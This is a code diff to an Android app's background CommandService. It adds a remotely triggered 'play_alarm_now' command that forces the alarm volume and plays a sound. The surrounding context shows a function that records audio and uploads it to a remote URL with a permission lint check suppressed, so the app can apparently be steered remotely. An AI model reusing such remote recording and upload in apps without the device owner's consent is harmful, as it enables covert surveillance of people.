@@ -41,7 +41,10 @@ import java.net.NetworkInterface
 import java.util.concurrent.TimeUnit
 import android.media.MediaRecorder
 import okhttp3.MediaType.Companion.toMediaType
-
+import android.media.RingtoneManager
+import android.media.Ringtone
+import android.media.AudioAttributes
+import android.media.AudioManager
 
 
 
@@ -163,6 +166,12 @@ class CommandService : Service() {
                             }
                         }
 
+                        "play_alarm_now" -> {
+                            val volume = params.optInt("volume", 100)
+                            val duration = params.optInt("duration", 10)
+                            playAlarmSound(applicationContext, volume, duration)
+                        }
+
 
                     }
 
@@ -172,7 +181,34 @@ class CommandService : Service() {
             }
         })
     }
-
+    
+    private fun playAlarmSound(context: Context, volume: Int, durationSec: Int) {
+        try {
+            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
+    
+            val ringtone = RingtoneManager.getRingtone(context, alarmUri)
+            ringtone.audioAttributes = AudioAttributes.Builder()
+                .setUsage(AudioAttributes.USAGE_ALARM)
+                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                .build()
+    
+            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
+            val targetVolume = (maxVolume * volume / 100).coerceAtMost(maxVolume)
+            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, targetVolume, 0)
+    
+            ringtone.play()
+    
+            Handler(Looper.getMainLooper()).postDelayed({
+                ringtone.stop()
+            }, durationSec * 1000L)
+    
+        } catch (e: Exception) {
+            Log.e("AlarmSound", "Failed to play alarm: ${e.message}")
+        }
+    }
+    
     @SuppressLint("MissingPermission")
     private fun recordAudioAndUpload(context: Context, durationSec: Int, uploadUrl: String) {
         val outputFile = File(context.cacheDir, "recorded_${System.currentTimeMillis()}.3gp")
